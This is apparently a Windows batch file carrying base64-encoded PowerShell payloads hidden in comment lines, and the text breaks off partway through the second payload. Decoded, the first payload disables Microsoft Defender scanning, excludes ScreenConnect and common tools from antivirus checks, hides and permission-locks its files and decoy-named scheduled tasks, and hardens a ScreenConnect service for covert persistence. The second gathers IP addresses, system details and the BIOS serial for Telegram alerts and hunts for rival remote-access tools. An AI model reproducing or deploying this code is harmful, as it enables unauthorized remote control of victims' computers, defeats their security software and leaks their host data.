::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCBe
::DQogICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzsi
::IF4NCiAgIlRyeXtTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25p
::dG9yaW5nICR0cnVlOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmVoYXZpb3JN
::b25pdG9yaW5nICR0cnVlOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSU9BVlBy
::b3RlY3Rpb24gJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3JpcHRT
::Y2FubmluZyAkdHJ1ZX1DYXRjaHt9OyIgXg0KICAiJHBhdGhzPUAoJyVXRCUnLCcl
::V0QyJScsJ0M6XFdpbmRvd3NcVGVtcCcsJGVudjpURU1QLCclUEYlXFNjcmVlbkNv
::bm5lY3QgQ2xpZW50KicsJyVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudConKTsi
::IF4NCiAgInRyeXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OlBy
::b2dyYW1GaWxlcyAtRmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJl
::Y3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX1jYXRj
::aHt9OyIgXg0KICAidHJ5eyRwZjg2PVtFbnZpcm9ubWVudF06OkdldEZvbGRlclBh
::dGgoJ1Byb2dyYW1GaWxlc1g4NicpOyBpZigkcGY4Nil7JHBhdGhzKz1AKEdldC1D
::aGlsZEl0ZW0gLVBhdGggJHBmODYgLUZpbHRlciAnU2NyZWVuQ29ubmVjdCBDbGll
::bnQqJyAtRGlyZWN0b3J5IC1FQSAwIHwgRm9yRWFjaC1PYmplY3QgeyRfLkZ1bGxO
::YW1lfSl9fWNhdGNoe307IiBeDQogICJmb3JlYWNoKCRwIGluICgkcGF0aHMgfCBT
::ZWxlY3QtT2JqZWN0IC1VbmlxdWUpKXsgaWYoJHApeyBBZGQtTXBQcmVmZXJlbmNl
::IC1FeGNsdXNpb25QYXRoICRwIC1FQSAwIH0gfTsiIF4NCiAgImZvcmVhY2goJHgg
::aW4gQCgnbXNpZXhlYy5leGUnLCdjdXJsLmV4ZScsJ2NtZC5leGUnLCdwb3dlcnNo
::ZWxsLmV4ZScsJ2NlcnR1dGlsLmV4ZScsJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2Vy
::dmljZS5leGUnLCdTY3JlZW5Db25uZWN0LldpbmRvd3NDbGllbnQuZXhlJykpeyBB
::ZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25Qcm9jZXNzICR4IC1FQSAwIH07IiBe
::DQogICJBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5jbWQn
::LCcucHMxJywnLm1zaScgLUVBIDAiID5udWwgMj4mMQ0KDQpSRU0gLS0tIEFDTDog
::b25seSBTWVNURU0gKyBBZG1pbmlzdHJhdG9ycyBvbiBwZXJzaXN0IGRpcnMgLS0t
::DQpjYWxsIDpMb2NrRGlyICIlV0QlIg0KY2FsbCA6TG9ja0RpciAiJVdEMiUiDQoN
::ClJFTSAtLS0gaGlkZSB3b3JrZGlycyArIGtleSBwYXlsb2FkIGZpbGVzIC0tLQ0K
::YXR0cmliICtoICtzICIlV0QlIiA+bnVsIDI+JjENCmF0dHJpYiAraCArcyAiJVdE
::MiUiID5udWwgMj4mMQ0KUkVNIFM1OiBkbyBOT1QgaGlkZS9sb2NrIHRoZSBtdXRh
::YmxlIHBheWxvYWQgc2NyaXB0cyAtIGNvcHkvbW92ZSBvdmVyICtoICtzIGZpbGVz
::DQpSRU0gZmFpbHMgc2lsZW50bHkgYW5kIGZyb3plIHRoZSB3aG9sZSBmbGVldCdz
::IHNlbGYtdXBkYXRlLiBIaWRkZW4gZGlycyBjb25jZWFsIGNvbnRlbnRzIGFscmVh
::ZHkuDQpmb3IgJSVGIGluIChwa2cubXNpIG5vdGlmeS5jZmcgaWRlbnRpdHkuY2Zn
::IHN0YXRlLmpzb24pIGRvICgNCiAgaWYgZXhpc3QgIiVXRCVcJSVGIiBhdHRyaWIg
::K2ggK3MgIiVXRCVcJSVGIiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBBQ0w6IHNj
::aGVkdWxlZCB0YXNrIFhNTCAoaGFyZGVyIHRvIGRlbGV0ZSB3aXRob3V0IEFkbWlu
::KSAtLS0NClJFTSBTNjogbmFtZXMgY29udGFpbiBzcGFjZXMgKCJTZXJ2ZXIgRGlh
::Z25vc3RpY3MiKSAtIHRoZSBjbWQgRk9SIGxvb3Agc3BsaXQNClJFTSB0aGVtIGlu
::dG8gZ2FyYmFnZSB0b2tlbnMuIFBvd2VyU2hlbGwgcmVhZHMgaWRlbnRpdHkuY2Zn
::IGRpcmVjdGx5IGluc3RlYWQuDQpwb3dlcnNoZWxsLmV4ZSAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCBe
::DQogICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzsg
::JG5hbWVzPUAoKTsiIF4NCiAgImlmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJyVX
::RCVcaWRlbnRpdHkuY2ZnJyl7IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAnJVdE
::JVxpZGVudGl0eS5jZmcnIC1Gb3JjZSB8IEZvckVhY2gtT2JqZWN0IHsgaWYoJF8g
::LW1hdGNoICdeVEFTS19bQS1EXT0oLispJCcpeyAkbmFtZXMgKz0gJG1hdGNoZXNb
::MV0uVHJpbSgpLlRyaW1TdGFydCgnXCcpIH0gfSB9IiBeDQogICJlbHNlIHsgJG5h
::bWVzPUAoJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ1dkaUhvc3RQ
::cm94eScsJ1RjcElwQ29uZmxpY3RSZXMnKSB9OyIgXg0KICAiZm9yZWFjaCgkbiBp
::biAkbmFtZXMpeyAkZiA9IEpvaW4tUGF0aCAnJVRBU0tST09UJScgJG47IGlmKFRl
::c3QtUGF0aCAtTGl0ZXJhbFBhdGggJGYpeyAmIGljYWNscy5leGUgJGYgL2luaGVy
::aXRhbmNlOnIgfCBPdXQtTnVsbDsgJiBpY2FjbHMuZXhlICRmIC9ncmFudDpyICdO
::VCBBVVRIT1JJVFlcU1lTVEVNOkYnICdCVUlMVElOXEFkbWluaXN0cmF0b3JzOkYn
::IHwgT3V0LU51bGw7ICYgYXR0cmliLmV4ZSAraCArcyAkZiB8IE91dC1OdWxsIH0g
::fSIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBXTUkgd2F0Y2hkb2cgc3Vic2Ny
::aXB0aW9uIGZpbGVzIChjaGFpbiAyKSAtLS0NCmljYWNscyAiJVN5c3RlbVJvb3Ql
::XFN5c3RlbTMyXHdiZW1cUmVwb3NpdG9yeSIgL2dyYW50ICJOVCBBVVRIT1JJVFlc
::U1lTVEVNOkYiID5udWwgMj4mMQ0KDQpSRU0gLS0tIEFDTDogZG8gTk9UIExvY2tE
::aXIgU2NyZWVuQ29ubmVjdCBpbnN0YWxsIGRpcnMgLS0tDQpSRU0gdGFrZW93bitz
::dHJpcCBvbiBsaXZlIFNDIGRpcnMgYnJlYWtzIGNsaWVudCBmaWxlIHdyaXRlcy91
::cGRhdGVzIOKGkiBwYW5lbCBPRkZMSU5FDQpSRU0gd2hpbGUgc2VydmljZSBzdGls
::bCBsb29rcyBSdW5uaW5nLiBEZWZlbmRlciBleGNsdXNpb25zICsgc2VydmljZSBT
::RCBhcmUgZW5vdWdoLg0KUkVNIE8zNzogb25lLXNob3QgdW5sb2NrIGlmIGEgcHJp
::b3IgYnVpbGQgTG9ja0RpcidkIHRoZXNlIHBhdGhzLg0KaWYgZXhpc3QgIiVXRCVc
::c2VjdXJlX3NjLmZsYWciICgNCiAgZmluZHN0ciAvQzoic2Nfbm9sb2NrX2RpcnMi
::ICIlV0QlXHNlY3VyZV9zYy5mbGFnIiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZl
::bCAxICgNCiAgICBlY2hvIHNjX3VubG9ja19wcmlvcl9sb2NrZGlyPj4iJUxPRyUi
::DQogICAgZm9yICUlRCBpbiAoDQogICAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENs
::aWVudCAoJUtFRVAxJSkiDQogICAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVu
::dCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglS0VFUDElKSINCiAgICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQg
::KCVLRUVQMiUpIg0KICAgICkgZG8gKA0KICAgICAgaWYgZXhpc3QgIiUlfkQiICgN
::CiAgICAgICAgdGFrZW93biAvRiAiJSV+RCIgL1IgL0QgWSA+bnVsIDI+JjENCiAg
::ICAgICAgaWNhY2xzICIlJX5EIiAvcmVzZXQgL1QgL0MgL1EgPm51bCAyPiYxDQog
::ICAgICAgIGljYWNscyAiJSV+RCIgL2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVN
::OihPSSkoQ0kpRiIgIkJVSUxUSU5cQWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiA+
::bnVsIDI+JjENCiAgICAgICkNCiAgICApDQogICAgZWNobyBzY19ub2xvY2tfZGly
::cz4lV0QlXHNlY3VyZV9zYy5mbGFnDQogICkNCikgZWxzZSAoDQogIGVjaG8gc2Nf
::bm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KKQ0KDQpSRU0gLS0tIFND
::IHNlcnZpY2VzOiBTWVNURU0gY2FuIGNvbmZpZy9zdG9wL2RlbGV0ZS9zZHNldDsg
::QkEgZnVsbDsgdXNlcnMgYmxvY2tlZCAtLS0NClJFTSBTMTI6IFNZIG11c3QgaW5j
::bHVkZSBTRCAoREVMRVRFKSArIFdEIChXUklURV9EQUMpICsgV1Agc28gb3JwaGFu
::IGhlYWwgLyBGUCBtaWdyYXRpb24gLw0KUkVNIHNjIHNkc2V0IHJlLWFwcGx5IHdv
::cmsgdW5kZXIgU1lTVEVNICh0YXNrcyBydW4gYXMgU1lTVEVNKS4gV2l0aG91dCBT
::RCwgc2MgZGVsZXRlIEFjY2VzcyBEZW5pZWQuDQpzZXQgIlNEPUQ6KEE7O0NDRENM
::Q1NXUlBXUERUTE9DUlJDU0RXUDs7O1NZKShBOztDQ0RDTENTV1JQV1BEVExPQ1JT
::RFJDV0RXTzs7O0JBKSINCnNjLmV4ZSBzZHNldCAiJVBSSU0lIiAiJVNEJSIgPm51
::bCAyPiYxDQpzYy5leGUgc2RzZXQgIiVBTFQlIiAiJVNEJSIgPm51bCAyPiYxDQpz
::Yy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2Mu
::ZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhl
::IGZhaWx1cmUgIiVQUklNJSIgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQv
::NjAwMDAvcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwID5udWwgMj4mMQ0Kc2Mu
::ZXhlIGZhaWx1cmUgIiVBTFQlIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFy
::dC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoN
::CmVjaG8gc2VjdXJlX2RvbmU+PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rp
::cg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAiJVQlIiBleGl0IC9iIDANClJF
::TSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRlZCBBQ0VzOyBTWVNU
::RU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+bnVsIDI+
::JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNs
::cyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYi
::ICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQpp
::Y2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNl
::cnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRFUkFDVElWRSIgIkJVSUxU
::SU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDRUMTcgLSBHRFJPUCBzdGF0ZSAvIFRHIGFsZXJ0cw0KcGFyYW0oDQogICAgW1Bh
::cmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RhdGUsDQogICAg
::W3N0cmluZ10kU3VtbWFyeSA9ICcnLA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAn
::QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2Fj
::aGUnLA0KICAgIFtzdHJpbmddJE9sZFN0YXRlID0gJycsDQogICAgW1ZhbGlkYXRl
::U2V0KCdyaWNoJywgJ2NvbXBhY3QnKV1bc3RyaW5nXSRNb2RlID0gJ3JpY2gnLA0K
::ICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsDQogICAgW3N0cmluZ10kQ291bnQg
::PSAnMCcNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNv
::bnRpbnVlJw0KJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVl
::Jw0KdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90
::b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNo
::IHt9DQoNCmZ1bmN0aW9uIEdldC1DZmcgew0KICAgICRwYXRoID0gSm9pbi1QYXRo
::ICRXb3JrRGlyICdub3RpZnkuY2ZnJw0KICAgICRjZmcgPSBAe30NCiAgICBpZiAo
::LW5vdCAoVGVzdC1QYXRoICRwYXRoKSkgeyByZXR1cm4gJGNmZyB9DQogICAgR2V0
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3Qgew0K
::ICAgICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVphLXowLTlfXSspXHMqPVxz
::KiguKilccyokJykgew0KICAgICAgICAgICAgJGNmZ1skbWF0Y2hlc1sxXV0gPSAk
::bWF0Y2hlc1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4g
::JGNmZw0KfQ0KDQpmdW5jdGlvbiBFc2MoW3N0cmluZ10kcykgew0KICAgIGlmICgk
::bnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0NCiAgICByZXR1cm4gKCRzIC1yZXBs
::YWNlICcmJywgJyZhbXA7JyAtcmVwbGFjZSAnPCcsICcmbHQ7JyAtcmVwbGFjZSAn
::PicsICcmZ3Q7JykNCn0NCg0KZnVuY3Rpb24gR2V0LVB1YmxpY0lwIHsNCiAgICBm
::b3JlYWNoICgkdSBpbiBAKA0KICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5
::Lm9yZycsDQogICAgICAgICAgICAnaHR0cHM6Ly9pZmNvbmZpZy5tZS9pcCcsDQog
::ICAgICAgICAgICAnaHR0cHM6Ly9pY2FuaGF6aXAuY29tJw0KICAgICAgICApKSB7
::DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkciA9IEludm9rZS1XZWJSZXF1
::ZXN0IC1VcmkgJHUgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyA2DQogICAg
::ICAgICAgICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQ0K
::ICAgICAgICAgICAgaWYgKCRpcCAtbWF0Y2ggJ15cZHsxLDN9KFwuXGR7MSwzfSl7
::M30kJyAtb3IgJGlwIC1tYXRjaCAnOicpIHsgcmV0dXJuICRpcCB9DQogICAgICAg
::IH0gY2F0Y2gge30NCiAgICB9DQogICAgcmV0dXJuICduL2EnDQp9DQoNCmZ1bmN0
::aW9uIEdldC1Mb2NhbElwcyB7DQogICAgdHJ5IHsNCiAgICAgICAgJGlwcyA9IEdl
::dC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAk
::Xy5JUEFkZHJlc3MgLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfLlByZWZpeE9yaWdp
::biAtbmUgJ1dlbGxLbm93bicgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0
::IC1FeHBhbmRQcm9wZXJ0eSBJUEFkZHJlc3MgLVVuaXF1ZQ0KICAgICAgICBpZiAo
::JGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gg
::e30NCiAgICB0cnkgew0KICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdp
::bjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJs
::ZWQ9VHJ1ZScgfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyAkXy5JUEFk
::ZHJlc3MgfSB8IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgJF8gLW5vdGxpa2UgJzEy
::Ny4qJyAtYW5kICRfIC1ub3RsaWtlICcqOionIH0NCiAgICAgICAgaWYgKCRpcHMp
::IHsgcmV0dXJuICgoJGlwcyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkgLWpvaW4g
::JywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJ24vYScNCn0NCg0K
::ZnVuY3Rpb24gR2V0LU9zSW5mbyB7DQogICAgJG8gPSBbb3JkZXJlZF1Aew0KICAg
::ICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsgQnVpbGQgPSAn
::bi9hJzsgQXJjaCA9ICduL2EnDQogICAgICAgIERvbWFpbiA9ICduL2EnOyBJbnN0
::YWxsRGF0ZSA9ICduL2EnOyBMYXN0Qm9vdCA9ICduL2EnDQogICAgICAgIENQVSA9
::ICduL2EnOyBNYW51ZmFjdHVyZXIgPSAnbi9hJzsgTW9kZWwgPSAnbi9hJzsgU2Vy
::aWFsID0gJ24vYScNCiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0Zy
::ZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0IgPSAnbi9hJw0KICAgIH0NCiAgICB0
::cnkgew0KICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0
::aW5nU3lzdGVtDQogICAgICAgICRvLkNhcHRpb24gPSAkb3MuQ2FwdGlvbg0KICAg
::ICAgICAkby5WZXJzaW9uID0gJG9zLlZlcnNpb24NCiAgICAgICAgJG8uQnVpbGQg
::PSAkb3MuQnVpbGROdW1iZXINCiAgICAgICAgJG8uQXJjaCA9ICRvcy5PU0FyY2hp
::dGVjdHVyZQ0KICAgICAgICAkby5JbnN0YWxsRGF0ZSA9ICgkb3MuSW5zdGFsbERh
::dGUgfCBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkJykNCiAgICAgICAgJG8u
::TGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1h
::dCAneXl5eS1NTS1kZCBISDptbScpDQogICAgICAgICRvLlRvdGFsUkFNX0dCID0g
::W21hdGhdOjpSb3VuZCgkb3MuVG90YWxWaXNpYmxlTWVtb3J5U2l6ZSAvIDFNQiwg
::MSkNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJGNzID0gR2V0
::LUNpbUluc3RhbmNlIFdpbjMyX0NvbXB1dGVyU3lzdGVtDQogICAgICAgICRvLkRv
::bWFpbiA9IGlmICgkY3MuUGFydE9mRG9tYWluKSB7ICRjcy5Eb21haW4gfSBlbHNl
::IHsgJGNzLldvcmtncm91cCB9DQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9ICRj
::cy5NYW51ZmFjdHVyZXINCiAgICAgICAgJG8uTW9kZWwgPSAkY3MuTW9kZWwNCiAg
::ICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJG8uQ1BVID0gKEdldC1D
::aW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzb3IgfCBTZWxlY3QtT2JqZWN0IC1GaXJz
::dCAxIC1FeHBhbmRQcm9wZXJ0eSBOYW1lKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0
::cnkgew0KICAgICAgICAkby5TZXJpYWwgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMy
::X0JJT1MpLlNlcmlhbE51bWJlcg0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0K
::ICAgICAgICAkZCA9IEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Mb2dpY2FsRGlzayAt
::RmlsdGVyICJEZXZpY2VJRD0nQzonIg0KICAgICAgICAkby5EaXNrRnJlZV9HQiA9
::IFttYXRoXTo6Um91bmQoJGQuRnJlZVNwYWNlIC8gMUdCLCAxKQ0KICAgICAgICAk
::by5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwgMSkN
::CiAgICB9IGNhdGNoIHt9DQogICAgcmV0dXJuICRvDQp9DQoNCmZ1bmN0aW9uIEdl
::dC1TdmNMaW5lKFtzdHJpbmddJG5hbWUpIHsNCiAgICAkcyA9IEdldC1TZXJ2aWNl
::IC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::aWYgKC1ub3QgJHMpIHsgcmV0dXJuICdOT1QgSU5TVEFMTEVEJyB9DQogICAgcmV0
::dXJuICgnezB9IChTdGFydD17MX0pJyAtZiAkcy5TdGF0dXMsICRzLlN0YXJ0VHlw
::ZSkNCn0NCg0KZnVuY3Rpb24gR2V0LVRhc2tIZWFsdGgoW3N0cmluZ10kdG4pIHsN
::CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJ
::U1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFTVEVYSVRDT0RFIC1uZSAwIC1vciAt
::bm90ICRvdXQpIHsNCiAgICAgICAgcmV0dXJuIEB7IFByZXNlbnQgPSAkZmFsc2U7
::IFN0YXR1cyA9ICdNSVNTSU5HJzsgTmV4dCA9ICcnOyBMYXN0ID0gJyc7IFJlc3Vs
::dCA9ICcnOyBPdXJzID0gJGZhbHNlIH0NCiAgICB9DQogICAgJG1hcCA9IEB7fQ0K
::ICAgICRibG9iID0gKCRvdXQgfCBGb3JFYWNoLU9iamVjdCB7ICIkXyIgfSkgLWpv
::aW4gImBuIg0KICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsNCiAgICAgICAg
::aWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbXjpdKyk6XHMqKC4qKVxzKiQnKSB7DQog
::ICAgICAgICAgICAkbWFwWyRtYXRjaGVzWzFdLlRyaW0oKV0gPSAkbWF0Y2hlc1sy
::XS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICAkc3RhdHVzID0gJG1hcFsn
::U3RhdHVzJ10NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFw
::WydUYXNrIFN0YXR1cyddIH0NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0
::dXMgPSAncHJlc2VudCcgfQ0KICAgICRuZXh0ID0gJG1hcFsnTmV4dCBSdW4gVGlt
::ZSddDQogICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9DQogICAgJGxh
::c3QgPSAkbWFwWydMYXN0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbGFzdCkg
::eyAkbGFzdCA9ICcnIH0NCiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1bHQn
::XQ0KICAgIGlmICgtbm90ICRyZXN1bHQpIHsgJHJlc3VsdCA9ICcnIH0NCiAgICAk
::dHIgPSAkbWFwWydUYXNrIFRvIFJ1biddDQogICAgaWYgKC1ub3QgJHRyKSB7ICR0
::ciA9ICRtYXBbJ1Rhc2sgdG8gUnVuJ10gfQ0KICAgICRvdXJzID0gKCRibG9iIC1t
::YXRjaCAnKD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8XC53dWNhY2hlXFx8
::XC5ldGxjYWNoZVxcJykNCiAgICAjIFByZXNlbnQgV2luZG93cyBidWlsdC1pbiB3
::aXRoIHNhbWUgbmFtZSBpcyBOT1QgaGVhbHRoeSBmb3IgdXMNCiAgICAkaGVhbHRo
::eSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8UnVubmluZycp
::IC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKSkNCiAgICByZXR1cm4gQHsNCiAg
::ICAgICAgUHJlc2VudCA9ICR0cnVlDQogICAgICAgIE91cnMgICAgPSBbYm9vbF0k
::b3Vycw0KICAgICAgICBIZWFsdGh5ID0gW2Jvb2xdJGhlYWx0aHkNCiAgICAgICAg
::U3RhdHVzICA9ICQoaWYgKCRvdXJzKSB7ICRzdGF0dXMgfSBlbHNlIHsgJ05PVF9P
::VVJTJyB9KQ0KICAgICAgICBOZXh0ICAgID0gJG5leHQNCiAgICAgICAgTGFzdCAg
::ICA9ICRsYXN0DQogICAgICAgIFJlc3VsdCAgPSAkcmVzdWx0DQogICAgICAgIFRy
::ICAgICAgPSAkKGlmICgkdHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pDQogICAgfQ0K
::fQ0KDQpmdW5jdGlvbiBHZXQtUm1tSGl0cyB7DQogICAgIyBEZXRlY3Qgcml2YWxz
::IGZvciBUZWxlZ3JhbS4gS0VFUDogU2NyZWVuQ29ubmVjdCBhbGxvd2xpc3QgKyBE
::YXR0by9DZW50cmFTdGFnZS4NCiAgICAkdG9rZW5zID0gQCgNCiAgICAgICAgJ0Fu
::eURlc2snLCAnVGVhbVZpZXdlcicsICd0dm5zZXJ2ZXInLCAnRFdBZ2VudCcsICdE
::V1NlcnZpY2UnLCAnTG9nTWVJbicsICdMTUlHdWFyZGlhbicsDQogICAgICAgICdX
::aW5WTkMnLCAndm5jc2VydmVyJywgJ3R2XycsICdTcGxhc2h0b3AnLCAnWm9obyBB
::c3Npc3QnLCAnUnVzdERlc2snLCAnUmVtb3RlUEMnLCAnRGFtZVdhcmUnLA0KICAg
::ICAgICAnQXRlcmFBZ2VudCcsICdBdGVyYScsICdOaW5qYVJNTScsICdOaW5qYU9u
::ZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScsICdBZ2VudE1vbicsICdQdWxz
::ZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8nLA0KICAgICAg
::ICAnU3VwZXJPcHMnLCAnTWFuYWdlRW5naW5lJywgJ1VFTVMnLCAnRGVza3RvcCBD
::ZW50cmFsJywgJ0VuZHBvaW50IENlbnRyYWwnLCAnU29sYXJXaW5kcyBNU1AnLCAn
::Q29ubmVjdFdpc2UgQXV0b21hdGUnLCAnTFRTZXJ2aWNlJywgJ0xhYlRlY2gnLA0K
::ICAgICAgICAnQWN0aW9uMScsICdTaW1wbGVIZWxwJywgJ0JvbWdhcicsICdCZXlv
::bmRUcnVzdCcsICdNZXNoQWdlbnQnLCAnTWVzaCBDZW50cmFsJywgJ01lc2ggQWdl
::bnQnLA0KICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxybW0nLCAnR2V0
::U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywN
::CiAgICAgICAgJ0Nocm9tZSBSZW1vdGUgRGVza3RvcCcsICdQYXJzZWMnLCAnTmV0
::U3VwcG9ydCcsICdMZXZlbC5pbycsICdMZXZlbCBBZ2VudCcsDQogICAgICAgICdD
::b250aW51dW0nLCAnU0FBWicsICdOYXZlcmlzaycsICdJbW15Qm90JywgJ0F1dG9t
::b3gnLCAnYW1hZ2VudCcsICdBY3JvbmlzIEN5YmVyJywgJ0RvbW90eicsICdBdXZp
